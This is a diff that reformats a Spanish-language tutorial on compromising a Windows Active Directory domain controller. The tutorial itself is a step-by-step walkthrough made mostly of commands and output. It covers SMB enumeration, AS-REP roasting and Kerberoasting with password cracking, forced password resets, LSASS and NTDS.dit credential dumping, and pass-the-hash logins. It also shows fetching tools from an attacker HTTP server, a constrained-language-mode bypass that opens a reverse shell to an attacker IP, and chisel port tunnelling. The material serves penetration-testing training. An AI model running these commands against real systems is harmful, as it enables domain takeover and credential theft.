@@ -25,17 +25,19 @@ Aquí se describe una prueba de concepto en un servidor *Windows Server que es c
 1. Primero enumeramos el servicio SMB para obtener información del SO, nombres de dominio y recursos compartidos:
 
 
-```css
-cme smb 10.10.10.50
+```shell
+$ cme smb 10.10.10.50
 ...
-crackmapexec smb 10.10.10.50
+
+$ crackmapexec smb 10.10.10.50
 ```
 
 2. Intentamos autenticarnos con una sesión nula para ver los recursos compartidos:
 
-```css
-smbmap -H 10.10.10.50 -u 'null'
+```shell
+$ smbmap -H 10.10.10.50 -u 'null'
 ...
+
 C$                     NO ACCESS
 COMPARTIDO             READ ONLY
 ...
@@ -43,8 +45,8 @@ COMPARTIDO             READ ONLY
 
 3. Si nos muestra algún recurso con permisos de lectura, como en este caso el recurso 'COMPARTIDO', podemos intentar visualizar el contenido:
 
-```css
-smbmap -H 10.10.10.50 -u 'null' -r 'COMPARTIDO'
+```shell
+$ smbmap -H 10.10.10.50 -u 'null' -r 'COMPARTIDO'
 ```
 
  - En el caso que encontráramos carpetas relevantes como nombres de usuario, lo más recomendable es hacernos un diccionario con dichos nombres para posteriormente utilizarlos en ataques de fuerza bruta.
@@ -54,8 +56,8 @@ smbmap -H 10.10.10.50 -u 'null' -r 'COMPARTIDO'
 
 1. Si tenemos un diccionario con posibles usuarios podemos intentar de validarlos en el domino a través del protocolo *kerberos* con la herramienta *kerbrute*:
 
-```css
-kerbrute -dc-ip 10.10.10.50 -domain contoso.local -users usuarios.txt
+```shell
+$ kerbrute -dc-ip 10.10.10.50 -domain contoso.local -users usuarios.txt
 
 [*] Valid user => lisa
 [*] Valid user => john [NOT PREAUTH]
@@ -66,19 +68,21 @@ kerbrute -dc-ip 10.10.10.50 -domain contoso.local -users usuarios.txt
 
 3. Con este comando podemos generarnos un TGT (Ticket Granting Ticket) para el usuario *john*:
 
-```css
-impacket-GetNPUsers contoso.local/john -no-pass
+```shell
+$ impacket-GetNPUsers contoso.local/john -no-pass
 
 [*] Getting TGT for john
 ...
+
 $krb5asrep$23$john@contoso.local:j34598erwjher9t459tertgh9564754h$9rtey456yh945y9456dssdsdddk4458dff8f...
 ```
 
 4. Una vez tenemos el TGT lo guardamos en una archivo llamado "hash" y podemos intentar crackearlo con *john the ripper*:
 
-```bash
-john --wordlist=/usr/share/wordlists/rockyou.txt hash
+```shell
+$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
 ...
+
 mypassword123 (krb5asrep$23$john@CONTOSO.LOCAL)
 ...
 ```
@@ -88,9 +92,10 @@ mypassword123 (krb5asrep$23$john@CONTOSO.LOCAL)
 
 5. Una vez conseguido el password vamos a intentar validarnos con las credenciales obtenidas:
 
-```css
-crackmapexec smb 10.10.10.50 -u 'john' -p 'mypassword123'
+```shell
+$ crackmapexec smb 10.10.10.50 -u 'john' -p 'mypassword123'
 ...
+
 SMB    10.10.10.50    445    DC01    [+] CONTOSO.local\john:mypassword123
 ...
 ```
@@ -102,10 +107,11 @@ SMB    10.10.10.50    445    DC01    [+] CONTOSO.local\john:mypassword123
 
 1. Ahora que tenemos credenciales válidas, vamos a seguir enumerando el dominio.
 
-```css
-rpcclient -U 'john%mypassword123' 10.10.10.50
+```shell
+$ rpcclient -U 'john%mypassword123' 10.10.10.50
 ...
-rpcclient $> enumdomusers
+
+$ rpcclient $> enumdomusers
 user:[Administrator] rid:[0x1f4]
 user:[john] rid:[0x1f5]
 user:[lisa] rid:[0x44f]
@@ -114,12 +120,14 @@ user:[lisa] rid:[0x44f]
 
 2. Otra herramienta que podemos usar es *ldapdomaindump* pero como genera un archivo .html conviene levantar el servicio apache antes para poder visualizarlo.
 
-```css
-service apache2 start
+```shell
+$ service apache2 start
 ...
-cd /var/www/html
+
+$ cd /var/www/html
 ...
-ldapdomaindump -u 'contoso.local\john' -p 'mypassword123' 10.10.10.50
+
+$ ldapdomaindump -u 'contoso.local\john' -p 'mypassword123' 10.10.10.50
 ...
 [*] Connecting to host...
 ...
@@ -130,8 +138,8 @@ ldapdomaindump -u 'contoso.local\john' -p 'mypassword123' 10.10.10.50
 
 1. Como no tenemos acceso físico a la máquina para lanzar *SharpHound* utilizaremos esta herramienta que nos permitirá enumerar la información necesaria de forma remota.
 
-```css
-bloodhound-python -c all -u 'john' -p 'mypassword123' -ns 10.10.10.50 -d contoso.local
+```shell
+$ bloodhound-python -c all -u 'john' -p 'mypassword123' -ns 10.10.10.50 -d contoso.local
 ...
 ```
 
@@ -141,29 +149,34 @@ bloodhound-python -c all -u 'john' -p 'mypassword123' -ns 10.10.10.50 -d contoso
 
 3. Vamos a intentar cambiar la contraseña de ese usuario para validarnos con él y ver si dispone de nuevos permisos para seguir avanzando en la intrusión.
 
-```bash
-rpcclient -U 'john%mypassword123' 10.10.10.50
+```shell
+$ rpcclient -U 'john%mypassword123' 10.10.10.50
 ...
-rpcclient $> setuserinfo2 audit2020 23 'Contraseña123'
 
+$ rpcclient $> setuserinfo2 audit2020 23 'Contraseña123'
+```
+```
 OTRAS OPCIONES:
 rpcclient //10.10.10.50 -U "nombre_de_usuario%contraseña" -c 'setuserinfo2 audit2020 23 "Contraseña123"'
 ...
 rpcclient -c 'setuserinfo2 audit2020 23 "Contraseña123"' 10.10.10.50
-
+```
 [El número `23` en el comando `setuserinfo2` de `rpcclient` se refiere al nivel de información del usuario que deseas establecer](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration)[1](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration). [En este caso, el nivel `23` se utiliza para cambiar la contraseña de un usuario](https://medium.com/@jackleed/hack-the-box-writeup-4-blackfield-832bb9b5cef4)
 ```
 
 4. Otra manera:
 
-```bash
-net rpc password 'audit2020' -U 'john' -S 10.10.10.50
+```shell
+$ net rpc password 'audit2020' -U 'john' -S 10.10.10.50
 ...
+
 Enter new password fir audit2020:
 Password for [WORKGROUP\john]:
 ...
+```
 
 Validamos con CrackMapExec:
+```
 ...
 [+] CONTOSO.local\audit2020:Contraseña123
 ...
@@ -172,7 +185,7 @@ Validamos con CrackMapExec:
 5. Seguimos enumerando por SMB con los nuevos credenciales conseguidos:
 
 ```bash
-smbmap -H 10.10.10.50 -u 'audit2020' -p 'Contraseña123'
+$ smbmap -H 10.10.10.50 -u 'audit2020' -p 'Contraseña123'
 ...
 ```
 
@@ -181,8 +194,10 @@ smbmap -H 10.10.10.50 -u 'audit2020' -p 'Contraseña123'
 ```bash
 smbmap -H 10.10.10.50 -u 'audit2020' -p 'Contraseña123' -r documentos
 ...
+
 smbmap -H 10.10.10.50 -u 'audit2020' -p 'Contraseña123' -r forense
 ...
+
 etc...
 ```
 
@@ -191,19 +206,22 @@ etc...
 - NOTA: Si no queremos ir abriendo carpeta por carpeta lo mejor es hace un punto de anclaje del recurso compartido hacia nuestro equipo, también lo llaman "montura":
 
 ```bash
-mount -t cifs "//10.10.10.50/CarpetaCompartida" /mnt/
+$ mount -t cifs "//10.10.10.50/CarpetaCompartida" /mnt/
 ...
-ls -l /mnt
+
+$ ls -l /mnt
 ...
-cd mnt
-tree
+
+$ cd mnt
+$ tree
 ...
 ```
 
 - Para buscar archivos de lectura que tengamos para cualquier usuario:
 
 ```bash
-.../mnt # find . | sed 's/.\///' | while read line; do echo -e "\n--- $line ---"; smbcacls '\\10.10.10.50\CarpetaCompartida' $line -N | grep Everyone | grep -i FULL; done  
+$ cd /mnt 
+$ find . | sed 's/.\///' | while read line; do echo -e "\n--- $line ---"; smbcacls '\\10.10.10.50\CarpetaCompartida' $line -N | grep Everyone | grep -i FULL; done  
 ```
 
 ---
@@ -214,23 +232,25 @@ tree
 8. Nos lo descargamos a nuestra máquina para poder analizarlo:
 
 ```bash
-smbmap -H 10.10.10.50 -u 'audit2020' -p 'Contraseña123' --download forensic/memory_analysis/lsass.zip
+$ smbmap -H 10.10.10.50 -u 'audit2020' -p 'Contraseña123' --download forensic/memory_analysis/lsass.zip
 ```
 
 9. Cuando descomprimimos el archivo hay un archivo llamado *lsass.DMP*, vamos a ver qué tiene con *pypykatz*:
 
 ```bash
-pypykatz lsa minidump lsass.DMP
+$ pypykatz lsa minidump lsass.DMP
 ...
 ```
 
 10. Una vez obtenidos los usuarios y hashes de las contraseñas podemos usarlos para poder autenticarnos usando "pass the hash" con *evil-winrm*:
 
 ```bash
-evil-winrm -i 10.10.10.50 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
+$ evil-winrm -i 10.10.10.50 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
 ...
+
 WINRM (pwn3d!)
 ...
+
 PS C:\Users\svc_backup> whoami /priv
 ...
 PRIVILEGES INFORMATION
@@ -245,7 +265,7 @@ PRIVILEGES INFORMATION
 
 1. Vamos a seguir extrayendo información con *Evil-WinRM*:
 
-```css
+```PS
 Evil-WinRM PS C:\Users\svc_backup\Desktop> reg save HKLM\system system
 The operation completed successfully.
 ...
@@ -264,8 +284,8 @@ Info: Download successful!
 
 2. Si conseguimos descargarnos del registro las claves de sam y system podemos descifrarlas con *samdump2*:
 
-```css
-samdump2 system sam
+```shell
+$ samdump2 system sam
 ```
 
 
@@ -285,16 +305,18 @@ delete shadows volume %caracola%
 reset
 ```
 
+NOTA: Si nos os funciona probad añadiendo un espacio al final de cada línea.
+
 3. Ahora lo ejecutamos con *disk*
 
 ```bash
-diskshadow /s .\dirkshadow.txt
+$ diskshadow /s .\dirkshadow.txt
 ```
 
 4. Qué hacemos ahora? pues crackearlo con *impacket-secretsdump*:
 
 ```bash
-impacket-secretsdump -system -ntds ntds.dit LOCAL
+$ impacket-secretsdump -system -ntds ntds.dit LOCAL
 ...
 ```
 
@@ -303,11 +325,11 @@ impacket-secretsdump -system -ntds ntds.dit LOCAL
 6. Comprobamos las credenciales de administrador con un "pass to hash":
 
 ```bash
-crackmapexec smb 10.10.10.50 -u 'Administrator' -H '9658d1d1dcd9250115e2205d9f48400d'
+$ crackmapexec smb 10.10.10.50 -u 'Administrator' -H '9658d1d1dcd9250115e2205d9f48400d'
 ...
 (Pwn3d!)
 ...
-evil-winrm -i 10.10.10.50 -u 'Administrator' -H '9658d1d1dcd9250115e2205d9f48400d'
+$ evil-winrm -i 10.10.10.50 -u 'Administrator' -H '9658d1d1dcd9250115e2205d9f48400d'
 ...
 Evil WinRM Shell v.3.4
 ...
@@ -327,7 +349,7 @@ IconFile=\\10.10.14.14\smbFolder\image.jpg
 2. Por otro lado crearemos el recurso compartido con SAMBA en nuestra máquina visible desde la máquina víctima, verá una app con el icono con el .jpg que hayamos definido:
 
 ```bash
-impacket-smbserver smbFolder $(pwd) -smb2support
+$ impacket-smbserver smbFolder $(pwd) -smb2support
 ...
 ```
 
@@ -336,7 +358,7 @@ impacket-smbserver smbFolder $(pwd) -smb2support
 4. Cogemos ese hash y el usuario y lo crackeamos con *john*:
 
 ```bash
-john --wordlist=/usr/share/wordlists/rockyou.txt hash
+$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
 ...
 miSuperPassword123     (amanda)
 ```
@@ -352,8 +374,8 @@ miSuperPassword123     (amanda)
 
 1. Con las credenciales obtenidas del usuario "amanda" podemos lanzar contra un recurso en específico.
 
-```css
-impacket-GetUserSPNs contoso.local/amanda:miSuperPassword123 
+```shell
+$ impacket-GetUserSPNs contoso.local/amanda:miSuperPassword123 
 ```
 
 2. Los resultados obtenidos son pobres ya que no tenemos el puerto 88 de kerberos expuesto pero en el informe vemos que el usuario "amanda" pertenece a un grupo llamado "Remote Management Users" ¿Qué podemos hacer con esto? Pues autenticarnos en el sistema por *WinRM*. 
@@ -362,20 +384,20 @@ impacket-GetUserSPNs contoso.local/amanda:miSuperPassword123
 
 4. Nos autenticamos por WinRM contra el servidor:
 
-```css
-evil-winrm -S -c certnew.cer -K priv.key -i 10.10.10.50 -u 'amanda' -p 'miSuperPassword123'
+```shell
+$ evil-winrm -S -c certnew.cer -K priv.key -i 10.10.10.50 -u 'amanda' -p 'miSuperPassword123'
 ...
 ```
 
 5. El objetivo ahora es subir binarios (archivos ejecutables) al sistema.  Muy importante saber la arquitectura del sistema (32 ó 64 bits) para ejecutar el binario apropiado. Para ello levantaremos un servidor http en nuestro equipo y haremos la demanda de archivos desde el equipo víctima. Intentando evadir las protecciones antivirus y demás restricciones que nos pueden impedir que lo llevemos acabo. 
 
-```bash
-sudo python3 -m http.server 8080
+```shell
+$ sudo python3 -m http.server 8080
 ```
 
 7. En este caso descargaremos una versión de *Rubeus* ya compilada https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe y lo llevaremos a nuestra máquina víctima.
 
-```PowerShell
+```PS
 > iwr -uri http://10.10.14.200:8080/Rubeus.exe -Outfile .\Rubeus.exe
 ....
 > .\Rubeus.exe kerberoast /creduser:contoso.local\amanda /credpassword:miSuperPassword123
@@ -385,7 +407,7 @@ sudo python3 -m http.server 8080
 
 8. También vamos a ejecutar *SharpHound* (https://github.com/BloodHoundAD/SharpHound) que nos permitirá volver a volcar toda la información del dominio para poder analizarla de nuevo. Para ello copiaremos el binario dentro de la máquina víctima mediante el procedimiento descrito en el punto número 7.
 
-```PowerShell
+```PS
 > Import-module .\SharpHound.ps1 
 ....
 Importing *.ps1 files as modules is not allowed in ConstrainedLanguage Mode.
@@ -395,14 +417,14 @@ Importing *.ps1 files as modules is not allowed in ConstrainedLanguage Mode.
 
 9. En nuestro equipo nos pondremos en espera para recibir una consola:
 
-```bash
-rlwrap nc -nlvp 443
+```shell
+$ rlwrap nc -nlvp 443
 ```
 
 10. Descargamos el binario y lo pasamos a la máquina víctima y lo ejecutamos. Más info de *PsByPassCLM* aquí  https://github.com/padovah4ck/PSByPassCLM.
 11. Descarga binario compilado: https://github.com/padovah4ck/PSByPassCLM/blob/master/PSBypassCLM/PSBypassCLM/bin/x64/Debug/PsBypassCLM.exe
 
-```PowerShell
+```PS
 > C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.14.4 /rport=443 /U C:\Windows\Temp\CLM\PsBypassCLM.exe
 ```
 
@@ -414,7 +436,7 @@ rlwrap nc -nlvp 443
 
 1. Con *Rubeus* podemos generar el TGS para posteriormente crackearlo como hemos hecho un poco más arriba...
 
-```PowerShell
+```PS
 > .\Rubeus.exe kerberoast /creduser:contoso.local\amanda /credpassword:miSuperPassword123
 ....
 ```
@@ -423,34 +445,34 @@ rlwrap nc -nlvp 443
 
 - Del lado de nustro equipo iniciaremos *chisel* en modo servidor:
 
-```bash
-chisel server --reverse -p 1234
+```shell
+$ chisel server --reverse -p 1234
 ```
 
 - Del lado la máquina víctima iniciaremos *chisel.exe* para mapear los puertos 88 y 389 TCP:
 
-```PowerShell
+```PS
 > chisel.exe client 10.10.14.44:1234 R:88:127.0.0.1:88 R:389:127.0.0.1:389
 ```
 
 - De esta manera todo lo que escaneemos en nuestra máquina en localhost:88 y localhost:389 en realidad estaremos escaneando los puertos de la máquina víctima. Para comprobar los puertos que tenemos ocupados los podremos hacer con el comando de Linux *lsof*:
 
 ```bash
-lsof -i:88
+$ lsof -i:88
 ...
-lsof -i:389
+$ lsof -i:389
 ```
 
 2. Vamos a proceder a extraer el TGS ahora que tenemos expuestos los puertos en nuestra máquina:
 
-```css
-impacket-GetUserSPNs contoso.local/amanda:miSuperPassword123 -request -dc-ip 127.0.0.1 
+```shell
+$ impacket-GetUserSPNs contoso.local/amanda:miSuperPassword123 -request -dc-ip 127.0.0.1 
 ```
 
 3. Copiamos el hash extraído y lo crackeamos con nuestro amigo *john*:
 
-```bash
-john --wordlist=/usr/share/wordlists/rockyou.txt hash
+```shell
+$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
 ```
 
 
@@ -460,8 +482,8 @@ john --wordlist=/usr/share/wordlists/rockyou.txt hash
 
 1. A veces no tenemos expuestos de primeras los puertos 88, 389 y 445 TCP en un escaneo normal en IPv4. Para ello usaremos la herramienta *IOXIDResolver.py* que aprovechando el puerto 135 TCP se puede extraer la IPv6. https://github.com/mubix/IOXIDResolver
 
-```bash
-python3 IOXIDResolver.py -t 10.10.10.50
+```shell
+$ python3 IOXIDResolver.py -t 10.10.10.50
 ```
 
 ## ESCALADA DE PRIVILEGIOS
@@ -478,7 +500,7 @@ Se necesita ejecutar un meterpreter para migrar al PID de System.
 
 -----
 
-##### NOTA INFORMATIVA:  **Esta tutorial ha sido desarrollado a partir de una ponencia del gran David Ojeda (*@daviddojedaa*)
-Gracias por tu sabiduría.
+##### NOTA INFORMATIVA:  Este tutorial ha sido desarrollado a partir de una ponencia del gran David Ojeda [@daviddojedaa](https://x.com/daviddojedaa)
+Gracias por tu gran sabiduría.
 
 -----
